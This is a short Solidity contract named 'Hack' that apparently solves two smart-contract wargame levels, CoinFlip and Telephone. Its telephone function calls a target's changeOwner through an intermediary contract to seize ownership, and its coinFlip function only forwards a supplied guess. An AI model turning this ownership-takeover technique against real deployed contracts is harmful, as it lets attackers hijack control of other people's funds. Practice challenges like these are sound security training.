pragma solidity ^0.8.10;
import "forge-std/Test.sol";
contract Hack {
  function coinFlip(address _to, bool _side) public payable { // #3
    _to.call(abi.encodeWithSignature("flip(bool)", _side));
  }

  function telephone(address _to) public payable { // #4
    _to.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
  }
}